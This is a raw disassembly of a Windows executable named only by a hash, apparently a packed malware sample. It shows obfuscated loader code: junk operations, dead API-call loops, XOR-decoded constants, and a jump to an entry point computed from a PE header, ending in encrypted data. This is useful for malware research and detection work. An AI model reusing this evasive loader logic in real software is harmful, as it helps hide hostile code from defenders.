
f9bb10cdf2ca623ec4e7a9ecdb34cef7d9933e2bc96cc11506536e3ec623274a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x230
  401009:	add    DWORD PTR ds:0x4377a3,0x7b21
  401013:	push   esi
  401014:	or     DWORD PTR ds:0x4377b7,0x1d26
  40101e:	xor    eax,eax
  401020:	sbb    DWORD PTR ds:0x43774b,0x4377b7
  40102a:	mov    WORD PTR [ebp-0x24],ax
  40102e:	mov    DWORD PTR ds:0x437783,0x17
  401038:	cmp    DWORD PTR ds:0x437783,0x0
  40103f:	je     0x401075
  401045:	cmp    DWORD PTR ds:0x437783,0x23
  40104c:	jl     0x401075
  401052:	jmp    0x401065
  401057:	push   DWORD PTR [ebp-0x10]
  40105a:	push   0x43778f
  40105f:	call   DWORD PTR ds:0x43c960
  401065:	mov    eax,ds:0x437783
  40106a:	dec    eax
  40106b:	mov    ds:0x437783,eax
  401070:	jmp    0x401038
  401075:	mov    eax,ds:0x4375df
  40107a:	movzx  eax,BYTE PTR [eax]
  40107d:	push   eax
  40107e:	or     DWORD PTR ds:0x43774f,0x437783
  401088:	call   DWORD PTR ds:0x43ca38
  40108e:	cmp    eax,0x3
  401091:	mov    DWORD PTR ds:0x4377af,0x1a4e
  40109b:	jle    0x4010b7
  4010a1:	xor    eax,eax
  4010a3:	jmp    0x401a9e
  4010a8:	mov    DWORD PTR ds:0x4377b7,0x36bc
  4010b2:	jmp    0x4011b9
  4010b7:	push   0x0
  4010b9:	lea    eax,[ebp-0x1d0]
  4010bf:	or     DWORD PTR ds:0x4377af,0x4954
  4010c9:	push   eax
  4010ca:	sub    DWORD PTR ds:0x43770f,0x5936
  4010d4:	push   0x4374c3
  4010d9:	call   DWORD PTR ds:0x43c974
  4010df:	mov    DWORD PTR ds:0x43771f,0x19ca
  4010e9:	cmp    eax,0xffffffff
  4010ec:	mov    DWORD PTR ds:0x437773,0x6253
  4010f6:	je     0x401127
  4010fc:	and    DWORD PTR ds:0x43778f,0x437767
  401106:	xor    eax,eax
  401108:	mov    DWORD PTR ds:0x4377bb,0x7a95
  401112:	inc    eax
  401113:	mov    DWORD PTR ds:0x43778f,0x2676
  40111d:	jmp    0x401a9e
  401122:	jmp    0x4011b9
  401127:	push   0x8
  401129:	dec    DWORD PTR ds:0x43777b
  40112f:	push   0x4374eb
  401134:	push   0x87687663
  401139:	call   DWORD PTR ds:0x43c9c0
  40113f:	mov    DWORD PTR ds:0x43777f,0x66a5
  401149:	cmp    eax,0x8
  40114c:	jne    0x40117c
  401152:	mov    DWORD PTR ds:0x43774b,0x20c8
  40115c:	xor    eax,eax
  40115e:	mov    DWORD PTR ds:0x43775f,0x154c
  401168:	jmp    0x401a9e
  40116d:	mov    DWORD PTR ds:0x4377b3,0xffc
  401177:	jmp    0x4011b9
  40117c:	xor    DWORD PTR ds:0x43779b,0x43771b
  401186:	call   DWORD PTR ds:0x43c9d8
  40118c:	test   eax,eax
  40118e:	mov    DWORD PTR ds:0x43772f,0x40bc
  401198:	jne    0x4011b9
  40119e:	and    DWORD PTR ds:0x437793,0x2e57
  4011a8:	xor    eax,eax
  4011aa:	mov    DWORD PTR ds:0x4377af,0x587d
  4011b4:	jmp    0x401a9e
  4011b9:	sub    ecx,DWORD PTR ds:0x4377a7
  4011bf:	mov    DWORD PTR [ebp-0x20],0x0
  4011c6:	mov    DWORD PTR [ebp-0x148],0xf89c85b0
  4011d0:	adc    DWORD PTR ds:0x437717,edi
  4011d6:	mov    DWORD PTR [ebp-0x1dc],0xf89c85b3
  4011e0:	and    DWORD PTR ds:0x43772b,0x0
  4011ea:	jmp    0x4011fc
  4011ef:	mov    ecx,DWORD PTR ds:0x43772b
  4011f5:	inc    ecx
  4011f6:	mov    DWORD PTR ds:0x43772b,ecx
  4011fc:	cmp    DWORD PTR ds:0x43772b,0x10
  401203:	jae    0x40124a
  401209:	cmp    DWORD PTR ds:0x43772b,0xb
  401210:	ja     0x40124a
  401216:	jmp    0x40122b
  40121b:	push   0x43701b
  401220:	push   0x43707c
  401225:	call   DWORD PTR ds:0x43c964
  40122b:	cmp    DWORD PTR ds:0x43772b,0xa
  401232:	jne    0x401245
  401238:	mov    ecx,DWORD PTR ds:0x43772b
  40123e:	inc    ecx
  40123f:	mov    DWORD PTR ds:0x43772b,ecx
  401245:	jmp    0x4011ef
  40124a:	lea    eax,[ebp-0x1d8]
  401250:	mov    DWORD PTR [ebp-0x13c],eax
  401256:	lea    eax,[ebp-0x4]
  401259:	mov    ecx,DWORD PTR ds:0x43774f
  40125f:	and    DWORD PTR ds:0x437737,ecx
  401265:	mov    DWORD PTR [ebp-0x140],eax
  40126b:	mov    eax,ds:0x43739f
  401270:	mov    eax,DWORD PTR [eax+0x1c8]
  401276:	mov    eax,DWORD PTR [eax]
  401278:	mov    DWORD PTR ds:0x437737,0x16
  401282:	cmp    DWORD PTR ds:0x437737,0x0
  401289:	je     0x4012be
  40128f:	cmp    DWORD PTR ds:0x437737,0x1c
  401296:	jbe    0x4012be
  40129c:	jmp    0x4012ac
  4012a1:	push   0x437042
  4012a6:	call   DWORD PTR ds:0x43c968
  4012ac:	mov    ecx,DWORD PTR ds:0x437737
  4012b2:	dec    ecx
  4012b3:	mov    DWORD PTR ds:0x437737,ecx
  4012b9:	jmp    0x401282
  4012be:	xor    eax,0x75108b5
  4012c3:	add    eax,0x3272fb
  4012c8:	mov    DWORD PTR ds:0x43779b,0x40d
  4012d2:	mov    ecx,DWORD PTR [ebp-0x140]
  4012d8:	mov    DWORD PTR [ecx],eax
  4012da:	mov    DWORD PTR ds:0x43778f,0x630f
  4012e4:	lea    eax,[ebp-0x10]
  4012e7:	mov    DWORD PTR [ebp-0x12c],eax
  4012ed:	cmp    DWORD PTR ds:0x4375d3,0x456dfdfb
  4012f7:	mov    DWORD PTR ds:0x43776f,0x19c2
  401301:	jne    0x401496
  401307:	and    DWORD PTR ds:0x43771b,0x0
  401311:	jmp    0x401324
  401316:	xor    eax,eax
  401318:	xor    eax,DWORD PTR ds:0x43771b
  40131e:	inc    eax
  40131f:	mov    ds:0x43771b,eax
  401324:	cmp    DWORD PTR ds:0x43771b,0x15
  40132b:	jae    0x40137e
  401331:	cmp    DWORD PTR ds:0x43771b,0x8
  401338:	jbe    0x40137e
  40133e:	jmp    0x401361
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   0x437727
  40134b:	push   0x4762
  401350:	push   0x437104
  401355:	push   DWORD PTR [ebp-0x18]
  401358:	push   DWORD PTR [ebp-0x14]
  40135b:	call   DWORD PTR ds:0x43c96c
  401361:	cmp    DWORD PTR ds:0x43771b,0x7
  401368:	jne    0x401379
  40136e:	mov    eax,ds:0x43771b
  401373:	inc    eax
  401374:	mov    ds:0x43771b,eax
  401379:	jmp    0x401316
  40137e:	mov    eax,DWORD PTR [ebp-0x148]
  401384:	dec    ecx
  401385:	xor    eax,0x75108b5
  40138a:	add    eax,0x3272fb
  40138f:	mov    ecx,DWORD PTR ds:0x43739f
  401395:	mov    ecx,DWORD PTR [ecx+0x198]
  40139b:	sbb    DWORD PTR ds:0x43772f,0x437773
  4013a5:	mov    DWORD PTR [ecx],eax
  4013a7:	or     ecx,DWORD PTR ds:0x43775f
  4013ad:	mov    eax,DWORD PTR [ebp-0x148]
  4013b3:	mov    DWORD PTR ds:0x437753,0x15
  4013bd:	cmp    DWORD PTR ds:0x437753,0x0
  4013c4:	je     0x401418
  4013ca:	cmp    DWORD PTR ds:0x437753,0x9
  4013d1:	jg     0x401418
  4013d7:	jmp    0x4013ea
  4013dc:	push   0x43775b
  4013e1:	push   DWORD PTR [ebp-0xc]
  4013e4:	call   DWORD PTR ds:0x43c970
  4013ea:	cmp    DWORD PTR ds:0x437753,0xa
  4013f1:	jne    0x401404
  4013f7:	mov    ecx,DWORD PTR ds:0x437753
  4013fd:	dec    ecx
  4013fe:	mov    DWORD PTR ds:0x437753,ecx
  401404:	xor    ecx,ecx
  401406:	xor    ecx,DWORD PTR ds:0x437753
  40140c:	dec    ecx
  40140d:	mov    DWORD PTR ds:0x437753,ecx
  401413:	jmp    0x4013bd
  401418:	xor    eax,0x75108b5
  40141d:	and    DWORD PTR ds:0x43777b,0x0
  401427:	mov    ecx,DWORD PTR ds:0x43777b
  40142d:	inc    ecx
  40142e:	mov    DWORD PTR ds:0x43777b,ecx
  401434:	cmp    DWORD PTR ds:0x43777b,0x15
  40143b:	jl     0x401471
  401441:	jmp    0x401464
  401446:	push   DWORD PTR [ebp-0x14]
  401449:	push   0x43773f
  40144e:	push   DWORD PTR [ebp-0x1c]
  401451:	push   0x43706e
  401456:	push   0x8166
  40145b:	push   DWORD PTR [ebp-0x10]
  40145e:	call   DWORD PTR ds:0x43c978
  401464:	cmp    DWORD PTR ds:0x43777b,0x12
  40146b:	jb     0x401427
  401471:	add    eax,0x3272fb
  401476:	mov    ds:0x4375d3,eax
  40147b:	mov    eax,DWORD PTR [ebp-0x148]
  401481:	or     DWORD PTR ds:0x4377b3,edx
  401487:	xor    eax,0x75108b5
  40148c:	add    eax,0x3272fb
  401491:	mov    ds:0x437497,eax
  401496:	xor    DWORD PTR ds:0x43772b,ebx
  40149c:	mov    eax,ds:0x43739f
  4014a1:	mov    eax,DWORD PTR [eax+0x18c]
  4014a7:	mov    ecx,DWORD PTR [ebp-0x12c]
  4014ad:	neg    DWORD PTR ds:0x4377b7
  4014b3:	mov    eax,DWORD PTR [eax]
  4014b5:	sbb    DWORD PTR ds:0x437713,0x4377b3
  4014bf:	mov    DWORD PTR [ecx],eax
  4014c1:	mov    DWORD PTR [ebp-0x128],0xf89c85bc
  4014cb:	mov    DWORD PTR ds:0x437797,0x10
  4014d5:	cmp    DWORD PTR ds:0x437797,0x0
  4014dc:	je     0x40152b
  4014e2:	cmp    DWORD PTR ds:0x437797,0x20
  4014e9:	jg     0x40152b
  4014ef:	jmp    0x401518
  4014f4:	push   0x4370c1
  4014f9:	push   0x6f44
  4014fe:	push   0x27cf
  401503:	push   0x84b9
  401508:	push   0x17d9
  40150d:	push   0x366e
  401512:	call   DWORD PTR ds:0x43c97c
  401518:	xor    eax,eax
  40151a:	add    eax,DWORD PTR ds:0x437797
  401520:	dec    eax
  401521:	mov    ds:0x437797,eax
  401526:	jmp    0x4014d5
  40152b:	mov    DWORD PTR [ebp-0xc],0xf89c85bc
  401532:	movzx  eax,WORD PTR ds:0x437763
  401539:	sub    DWORD PTR ds:0x437773,eax
  40153f:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  401546:	mov    eax,ds:0x43778b
  40154b:	adc    DWORD PTR ds:0x43776b,eax
  401551:	mov    eax,ds:0x437463
  401556:	mov    eax,DWORD PTR [eax]
  401558:	mov    DWORD PTR [ebp-0x124],eax
  40155e:	mov    DWORD PTR [ebp-0x130],0xf89c85b0
  401568:	sbb    DWORD PTR ds:0x43773f,0x437793
  401572:	mov    DWORD PTR [ebp-0x138],0xf89c85bc
  40157c:	sub    eax,DWORD PTR ds:0x437743
  401582:	mov    DWORD PTR [ebp-0x1e4],0xf89c85b8
  40158c:	mov    eax,DWORD PTR [ebp-0x148]
  401592:	xor    eax,0x75108b5
  401597:	add    eax,0x3272fb
  40159c:	mov    DWORD PTR ds:0x4377af,0x1731
  4015a6:	mov    DWORD PTR [ebp-0x1e8],eax
  4015ac:	jmp    0x4015e1
  4015b1:	sub    DWORD PTR ds:0x4377b3,ecx
  4015b7:	mov    eax,DWORD PTR [ebp-0x1dc]
  4015bd:	neg    DWORD PTR ds:0x437723
  4015c3:	xor    eax,0x75108b5
  4015c8:	or     DWORD PTR ds:0x437733,ecx
  4015ce:	mov    ecx,DWORD PTR [ebp-0x1e8]
  4015d4:	lea    eax,[ecx+eax*1+0x3272fb]
  4015db:	mov    DWORD PTR [ebp-0x1e8],eax
  4015e1:	mov    eax,DWORD PTR [ebp-0x1dc]
  4015e7:	and    DWORD PTR ds:0x437753,0x0
  4015f1:	mov    ecx,DWORD PTR ds:0x437753
  4015f7:	inc    ecx
  4015f8:	mov    DWORD PTR ds:0x437753,ecx
  4015fe:	cmp    DWORD PTR ds:0x437753,0x4
  401605:	jbe    0x40164e
  40160b:	jmp    0x401625
  401610:	push   0x437089
  401615:	push   0x437000
  40161a:	push   0x400000
  40161f:	call   DWORD PTR ds:0x43c980
  401625:	cmp    DWORD PTR ds:0x437753,0x3
  40162c:	jne    0x401641
  401632:	xor    ecx,ecx
  401634:	xor    ecx,DWORD PTR ds:0x437753
  40163a:	inc    ecx
  40163b:	mov    DWORD PTR ds:0x437753,ecx
  401641:	cmp    DWORD PTR ds:0x437753,0x10
  401648:	jb     0x4015f1
  40164e:	xor    eax,0x75108b5
  401653:	mov    ecx,DWORD PTR [ebp-0x1dc]
  401659:	neg    DWORD PTR ds:0x43777f
  40165f:	xor    ecx,0x75108b5
  401665:	or     DWORD PTR ds:0x43774b,0x7a77
  40166f:	lea    eax,[eax+ecx*1+0x64e5f6]
  401676:	mov    DWORD PTR ds:0x43779f,0x1f
  401680:	cmp    DWORD PTR ds:0x43779f,0x0
  401687:	je     0x4016c6
  40168d:	cmp    DWORD PTR ds:0x43779f,0x26
  401694:	jbe    0x4016c6
  40169a:	jmp    0x4016b4
  40169f:	push   DWORD PTR [ebp-0x28]
  4016a2:	push   DWORD PTR [ebp-0x28]
  4016a5:	push   DWORD PTR [ebp-0xc]
  4016a8:	push   DWORD PTR [ebp-0x18]
  4016ab:	push   DWORD PTR [ebp-0x18]
  4016ae:	call   DWORD PTR ds:0x43c984
  4016b4:	mov    ecx,DWORD PTR ds:0x43779f
  4016ba:	dec    ecx
  4016bb:	mov    DWORD PTR ds:0x43779f,ecx
  4016c1:	jmp    0x401680
  4016c6:	mov    ecx,DWORD PTR [ebp-0x1dc]
  4016cc:	xor    ecx,0x75108b5
  4016d2:	lea    eax,[eax+ecx*1+0x3272fb]
  4016d9:	cmp    DWORD PTR [ebp-0x1e8],eax
  4016df:	ja     0x401726
  4016e5:	mov    eax,DWORD PTR [ebp-0x1dc]
  4016eb:	xor    eax,0x75108b5
  4016f0:	mov    ecx,DWORD PTR [ebp-0x1e8]
  4016f6:	lea    eax,[ecx+eax*1+0x3272fb]
  4016fd:	push   eax
  4016fe:	mov    eax,DWORD PTR [ebp-0x130]
  401704:	xor    eax,0x75108b5
  401709:	lea    eax,[ebp+eax*1+0x327303]
  401710:	push   eax
  401711:	mov    eax,ds:0x43739f
  401716:	push   DWORD PTR [eax+0x1bc]
  40171c:	call   0x401ab4
  401721:	jmp    0x4015b1
  401726:	mov    eax,DWORD PTR [ebp+0xc]
  401729:	mov    ds:0x437223,eax
  40172e:	mov    eax,DWORD PTR [ebp+0x10]
  401731:	mov    ds:0x43747f,eax
  401736:	mov    eax,ds:0x437223
  40173b:	sub    eax,0x3272fb
  401740:	xor    eax,0x75108b5
  401745:	mov    ecx,DWORD PTR [ebp-0x13c]
  40174b:	mov    DWORD PTR [ecx],eax
  40174d:	lea    eax,[ebp-0x144]
  401753:	mov    DWORD PTR [ebp-0x1e0],eax
  401759:	lea    eax,[ebp-0x1e0]
  40175f:	mov    DWORD PTR [ebp-0x134],eax
  401765:	lea    eax,[ebp+0x4]
  401768:	mov    ecx,DWORD PTR [ebp-0x1e0]
  40176e:	mov    DWORD PTR [ecx],eax
  401770:	mov    eax,DWORD PTR [ebp-0x1d8]
  401776:	xor    eax,0x75108b5
  40177b:	add    eax,0x3272fb
  401780:	xor    ecx,ecx
  401782:	sub    eax,0x5424137
  401787:	sbb    ecx,0x0
  40178a:	xor    eax,0x8a29a14b
  40178f:	xor    ecx,0x0
  401792:	mov    DWORD PTR [ebp-0x210],eax
  401798:	mov    DWORD PTR [ebp-0x20c],ecx
  40179e:	cmp    DWORD PTR [ebp-0x210],0x70941f81
  4017a8:	jne    0x4017bb
  4017ae:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  4017b5:	je     0x401831
  4017bb:	mov    eax,DWORD PTR [ebp-0x148]
  4017c1:	xor    eax,0x75108b5
  4017c6:	add    eax,0x3272fb
  4017cb:	mov    ecx,eax
  4017cd:	xor    esi,esi
  4017cf:	sub    ecx,0x5424137
  4017d5:	sbb    esi,0x0
  4017d8:	xor    ecx,0x8a29a14b
  4017de:	xor    esi,0x0
  4017e1:	mov    eax,DWORD PTR [ebp-0x4]
  4017e4:	cdq    
  4017e5:	sub    eax,0x5424137
  4017ea:	sbb    edx,0x0
  4017ed:	xor    eax,0x8a29a14b
  4017f2:	xor    edx,0x0
  4017f5:	mov    DWORD PTR [ebp-0x218],ecx
  4017fb:	mov    DWORD PTR [ebp-0x214],esi
  401801:	mov    DWORD PTR [ebp-0x220],eax
  401807:	mov    DWORD PTR [ebp-0x21c],edx
  40180d:	mov    eax,DWORD PTR [ebp-0x218]
  401813:	cmp    eax,DWORD PTR [ebp-0x220]
  401819:	jne    0x4019dc
  40181f:	mov    eax,DWORD PTR [ebp-0x214]
  401825:	cmp    eax,DWORD PTR [ebp-0x21c]
  40182b:	jne    0x4019dc
  401831:	mov    eax,DWORD PTR [ebp-0x148]
  401837:	xor    eax,0x75108b5
  40183c:	add    eax,0x3272fb
  401841:	xor    ecx,ecx
  401843:	sub    eax,0x5424137
  401848:	sbb    ecx,0x0
  40184b:	xor    eax,0x8a29a14b
  401850:	xor    ecx,0x0
  401853:	mov    edx,DWORD PTR [ebp-0x10]
  401856:	xor    esi,esi
  401858:	sub    edx,0x5424137
  40185e:	sbb    esi,0x0
  401861:	xor    edx,0x8a29a14b
  401867:	xor    esi,0x0
  40186a:	mov    DWORD PTR [ebp-0x228],eax
  401870:	mov    DWORD PTR [ebp-0x224],ecx
  401876:	mov    DWORD PTR [ebp-0x230],edx
  40187c:	mov    DWORD PTR [ebp-0x22c],esi
  401882:	mov    eax,DWORD PTR [ebp-0x228]
  401888:	cmp    eax,DWORD PTR [ebp-0x230]
  40188e:	jne    0x401936
  401894:	mov    eax,DWORD PTR [ebp-0x224]
  40189a:	cmp    eax,DWORD PTR [ebp-0x22c]
  4018a0:	jne    0x401936
  4018a6:	mov    eax,DWORD PTR [ebp-0x148]
  4018ac:	xor    eax,0x75108b5
  4018b1:	add    eax,0x3272fb
  4018b6:	mov    ecx,DWORD PTR ds:0x43739f
  4018bc:	mov    ecx,DWORD PTR [ecx+0x198]
  4018c2:	cmp    eax,DWORD PTR [ecx]
  4018c4:	jne    0x4018f1
  4018ca:	mov    eax,DWORD PTR [ebp-0x148]
  4018d0:	xor    eax,0x75108b5
  4018d5:	add    eax,0x3272fb
  4018da:	push   eax
  4018db:	push   0xf89c85bc
  4018e0:	push   DWORD PTR [ebp-0x1dc]
  4018e6:	push   DWORD PTR [ebp-0x148]
  4018ec:	call   0x414de4
  4018f1:	push   0xf89c85f0
  4018f6:	push   0xf89c87b0
  4018fb:	push   DWORD PTR [ebp-0x1dc]
  401901:	push   DWORD PTR [ebp-0x148]
  401907:	call   0x4155f6
  40190c:	mov    eax,DWORD PTR [ebp-0x148]
  401912:	xor    eax,0x75108b5
  401917:	add    eax,0x3272fb
  40191c:	mov    ds:0x43742b,eax
  401921:	mov    eax,DWORD PTR [ebp-0x148]
  401927:	xor    eax,0x75108b5
  40192c:	add    eax,0x3272fb
  401931:	mov    ds:0x437423,eax
  401936:	mov    eax,DWORD PTR [ebp-0x1e0]
  40193c:	mov    eax,DWORD PTR [eax]
  40193e:	mov    ecx,DWORD PTR [ebp-0x148]
  401944:	xor    ecx,0x75108b5
  40194a:	add    ecx,0x3272fb
  401950:	cmp    eax,ecx
  401952:	je     0x4019d7
  401958:	mov    DWORD PTR [ebp-0x1ec],0xf152c3b
  401962:	mov    DWORD PTR [ebp-0x1f8],0x712edce
  40196c:	mov    DWORD PTR [ebp-0x1f4],0x373fc28
  401976:	mov    DWORD PTR [ebp-0x1f0],0x72670ad8
  401980:	lea    eax,[ebp-0x1f0]
  401986:	push   eax
  401987:	lea    eax,[ebp-0x1f4]
  40198d:	push   eax
  40198e:	lea    eax,[ebp-0x1f8]
  401994:	push   eax
  401995:	lea    eax,[ebp-0x1ec]
  40199b:	push   eax
  40199c:	call   0x42d44a
  4019a1:	push   DWORD PTR [ebp-0x134]
  4019a7:	push   DWORD PTR [ebp-0x1d4]
  4019ad:	push   DWORD PTR [ebp-0x1dc]
  4019b3:	push   DWORD PTR [ebp-0x148]
  4019b9:	call   0x40408a
  4019be:	push   0x4
  4019c0:	mov    eax,ds:0x43739f
  4019c5:	add    eax,0x1cc
  4019ca:	push   eax
  4019cb:	lea    eax,[ebp-0x1d4]
  4019d1:	push   eax
  4019d2:	call   0x401ab4
  4019d7:	jmp    0x401a96
  4019dc:	lea    eax,[ebp-0x1fc]
  4019e2:	mov    DWORD PTR [ebp-0x208],eax
  4019e8:	lea    eax,[ebp-0x200]
  4019ee:	mov    DWORD PTR [ebp-0x204],eax
  4019f4:	mov    eax,DWORD PTR [ebp-0x204]
  4019fa:	mov    ecx,DWORD PTR ds:0x43739f
  401a00:	mov    DWORD PTR [eax],ecx
  401a02:	push   0x4
  401a04:	mov    eax,DWORD PTR [ebp-0x200]
  401a0a:	push   DWORD PTR [eax+0x194]
  401a10:	push   DWORD PTR [ebp-0x208]
  401a16:	call   0x401ab4
  401a1b:	mov    eax,DWORD PTR [ebp-0x208]
  401a21:	mov    eax,DWORD PTR [eax]
  401a23:	mov    ecx,DWORD PTR [ebp-0x200]
  401a29:	mov    ecx,DWORD PTR [ecx+0x194]
  401a2f:	mov    edx,DWORD PTR [ebp-0x200]
  401a35:	mov    edx,DWORD PTR [edx+0x194]
  401a3b:	mov    edx,DWORD PTR [edx]
  401a3d:	mov    ecx,DWORD PTR [ecx]
  401a3f:	mov    edx,DWORD PTR [edx+0x3c]
  401a42:	add    eax,DWORD PTR [ecx+edx*1+0x28]
  401a46:	mov    ecx,DWORD PTR [ebp-0x208]
  401a4c:	mov    DWORD PTR [ecx],eax
  401a4e:	push   DWORD PTR ds:0x43747f
  401a54:	push   DWORD PTR ds:0x437223
  401a5a:	mov    eax,ds:0x43739f
  401a5f:	mov    eax,DWORD PTR [eax+0x194]
  401a65:	push   DWORD PTR [eax]
  401a67:	mov    eax,DWORD PTR [ebp-0x1fc]
  401a6d:	call   eax
  401a6f:	mov    ecx,DWORD PTR ds:0x43739f
  401a75:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401a7b:	mov    DWORD PTR [ecx],eax
  401a7d:	push   0x4
  401a7f:	mov    eax,ds:0x43739f
  401a84:	add    eax,0x1cc
  401a89:	push   eax
  401a8a:	lea    eax,[ebp-0x1d4]
  401a90:	push   eax
  401a91:	call   0x401ab4
  401a96:	mov    eax,DWORD PTR [ebp-0x1d4]
  401a9c:	mov    eax,DWORD PTR [eax]
  401a9e:	pop    esi
  401a9f:	leave  
  401aa0:	ret    0xc
  401aa3:	push   ebp
  401aa4:	mov    ebp,esp
  401aa6:	xor    eax,eax
  401aa8:	and    DWORD PTR ds:0x437743,0x43770f
  401ab2:	pop    ebp
  401ab3:	ret    
  401ab4:	push   ebp
  401ab5:	mov    ebp,esp
  401ab7:	sub    esp,0x2c
  401aba:	and    DWORD PTR ds:0x437777,0x0
  401ac4:	jmp    0x401ad8
  401ac9:	xor    edx,edx
  401acb:	add    edx,DWORD PTR ds:0x437777
  401ad1:	inc    edx
  401ad2:	mov    DWORD PTR ds:0x437777,edx
  401ad8:	cmp    DWORD PTR ds:0x437777,0x18
  401adf:	jae    0x401b21
  401ae5:	cmp    DWORD PTR ds:0x437777,0x6
  401aec:	jg     0x401b21
  401af2:	jmp    0x401b00
  401af7:	push   DWORD PTR [ebp-0x28]
  401afa:	call   DWORD PTR ds:0x43c988
  401b00:	cmp    DWORD PTR ds:0x437777,0x5
  401b07:	jne    0x401b1c
  401b0d:	xor    edx,edx
  401b0f:	add    edx,DWORD PTR ds:0x437777
  401b15:	inc    edx
  401b16:	mov    DWORD PTR ds:0x437777,edx
  401b1c:	jmp    0x401ac9
  401b21:	push   esi
  401b22:	or     DWORD PTR ds:0x43770f,0x7b2e
  401b2c:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  401b33:	and    DWORD PTR ds:0x43779b,0x0
  401b3d:	jmp    0x401b4d
  401b42:	mov    eax,ds:0x43779b
  401b47:	inc    eax
  401b48:	mov    ds:0x43779b,eax
  401b4d:	cmp    DWORD PTR ds:0x43779b,0x18
  401b54:	jae    0x401b97
  401b5a:	cmp    DWORD PTR ds:0x43779b,0xa
  401b61:	jbe    0x401b97
  401b67:	jmp    0x401b7a
  401b6c:	push   0x4590
  401b71:	push   DWORD PTR [ebp-0x10]
  401b74:	call   DWORD PTR ds:0x43c98c
  401b7a:	cmp    DWORD PTR ds:0x43779b,0x9
  401b81:	jne    0x401b92
  401b87:	mov    eax,ds:0x43779b
  401b8c:	inc    eax
  401b8d:	mov    ds:0x43779b,eax
  401b92:	jmp    0x401b42
  401b97:	mov    DWORD PTR [ebp-0x8],0xf89c85b3
  401b9e:	mov    eax,DWORD PTR [ebp-0x4]
  401ba1:	add    edx,0x774
  401ba7:	xor    eax,0x75108b5
  401bac:	add    eax,0x3272fb
  401bb1:	add    DWORD PTR ds:0x437753,0x3afa
  401bbb:	xor    ecx,ecx
  401bbd:	and    edx,DWORD PTR ds:0x437767
  401bc3:	mov    edx,DWORD PTR [ebp+0x10]
  401bc6:	xor    esi,esi
  401bc8:	sub    edx,0x5424137
  401bce:	mov    DWORD PTR ds:0x43779f,0x3ed0
  401bd8:	sbb    esi,0x0
  401bdb:	sub    DWORD PTR ds:0x437747,0x437777
  401be5:	xor    edx,0x8a29a14b
  401beb:	xor    esi,0x0
  401bee:	xor    edx,0x8a29a14b
  401bf4:	xor    esi,0x0
  401bf7:	adc    DWORD PTR ds:0x43775f,0x43772f
  401c01:	add    edx,0x5424137
  401c07:	adc    esi,0x0
  401c0a:	mov    DWORD PTR [ebp-0x14],eax
  401c0d:	mov    DWORD PTR ds:0x43772f,0x4892
  401c17:	mov    DWORD PTR [ebp-0x10],ecx
  401c1a:	mov    DWORD PTR [ebp-0x1c],edx
  401c1d:	movzx  eax,BYTE PTR ds:0x43770f
  401c24:	mov    DWORD PTR [ebp-0x18],esi
  401c27:	mov    eax,DWORD PTR [ebp-0x14]
  401c2a:	cmp    eax,DWORD PTR [ebp-0x1c]
  401c2d:	mov    DWORD PTR ds:0x437747,0x1bf2
  401c37:	jne    0x401c53
  401c3d:	mov    eax,DWORD PTR [ebp-0x10]
  401c40:	mov    DWORD PTR ds:0x43777f,0x6546
  401c4a:	cmp    eax,DWORD PTR [ebp-0x18]
  401c4d:	je     0x404080
  401c53:	mov    eax,DWORD PTR [ebp+0xc]
  401c56:	mov    DWORD PTR ds:0x43774b,0x1906
  401c60:	cmp    eax,DWORD PTR [ebp+0x8]
  401c63:	mov    DWORD PTR ds:0x4377b7,0x6132
  401c6d:	je     0x404080
  401c73:	mov    eax,DWORD PTR [ebp-0x4]
  401c76:	xor    eax,0x75108b5
  401c7b:	add    eax,0x3272fb
  401c80:	jmp    0x403fce
  401c85:	int3   
  401c86:	xor    al,0xbc
  401c88:	push   ss
  401c89:	fs jbe 0x401ce0
  401c8c:	je     0x401c61
  401c8e:	or     DWORD PTR [edx+0x4f],0xffffffb9
  401c92:	stos   BYTE PTR es:[edi],al
  401c93:	ret    0x7b7c
  401c96:	jnp    0x401d13
  401c98:	jnp    0x401c44
  401c9a:	cwde   
  401c9b:	jnp    0x401d18
  401c9d:	rol    ebx,cl
  401c9f:	mov    esi,0xe4d7cdd6
  401ca4:	(bad)  
  401ca5:	fcmovnb st,st(4)
  401ca7:	cmc    
  401ca8:	(bad)  
  401ca9:	fucomi st,st(6)
  401cab:	ror    edx,cl
  401cad:	(bad)  
  401cae:	add    ebx,edx
  401cb0:	int3   
  401cb1:	int    0xcc
  401cb3:	sar    esi,cl
  401cb5:	inc    BYTE PTR [edx]
  401cb7:	retf   
  401cb8:	or     ch,dl
  401cba:	(bad)  
  401cbc:	enter  0xb8b3,0xd1
  401cc0:	mov    al,0xb0
  401cc2:	not    eax
  401cc4:	lods   al,BYTE PTR ds:[esi]
  401cc5:	out    dx,al
  401cc6:	ror    bl,0xf9
  401cc9:	aam    0xd6
  401ccb:	ret    
  401ccc:	ret    
  401ccd:	mov    ebp,0xdbe2e703
  401cd2:	idiv   ebp
  401cd4:	or     eax,esp
  401cd6:	leave  
  401cd7:	aam    0xc5
  401cd9:	or     ecx,esp
  401cdb:	add    DWORD PTR ds:0xb2c0d1c9,ecx
  401ce1:	in     al,0xe8
  401ce3:	icebp  
  401ce4:	sar    DWORD PTR [ebx-0x3244073c],0xb8
  401ceb:	jmp    0x401cdd
  401ced:	out    dx,al
  401cee:	aam    0xb8
  401cf0:	ret    
  401cf1:	neg    dh
  401cf3:	(bad)  
  401cf4:	fcomip st,st(7)
  401cf6:	xlat   BYTE PTR ds:[ebx]
  401cf7:	add    bl,ah
  401cf9:	enter  0xe604,0x11
  401cfd:	mov    edi,0xe4e1dcc7
  401d02:	call   0xd51317e7
  401d07:	mov    ah,0xeb
  401d09:	(bad)  
  401d0b:	idiv   BYTE PTR [edi+esi*4-0x21380c18]
  401d12:	push   es
  401d13:	add    al,0xe3
  401d15:	pop    es
  401d16:	jmp    0xfad8:0x13da08f4
  401d1d:	les    esi,FWORD PTR [ebx-0x281e230f]
  401d23:	lock mov ch,0xb9
  401d26:	mov    edx,0xbcf2acb5
  401d2b:	xlat   BYTE PTR ds:[ebx]
  401d2c:	jecxz  0x401cec
  401d2e:	(bad)  
  401d2f:	in     al,dx
  401d30:	in     al,dx
  401d31:	jecxz  0x401d34
  401d33:	icebp  
  401d34:	stc    
